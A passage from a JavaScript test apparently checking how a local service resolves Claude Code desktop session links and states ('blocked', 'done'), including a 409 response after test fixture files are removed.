  fs.writeFileSync(path.join(dir, 'local_cowork-it.json'), JSON.stringify({ sessionId: 'local_cowork-it', cliSessionId: id, isArchived: false }));

  put('blocked');
  assert.deepEqual((await post({ session_id: id })).json.dry_run, { kind: 'desktop', url: 'claude://code/needs-input?session=local_cowork-it' });
  put('done');
  assert.deepEqual((await post({ session_id: id })).json.dry_run, { kind: 'desktop-app' });
  fs.rmSync(path.join(home, 'Library'), { recursive: true, force: true });
  assert.equal((await post({ session_id: id })).status, 409);
  fs.rmSync(file);
});
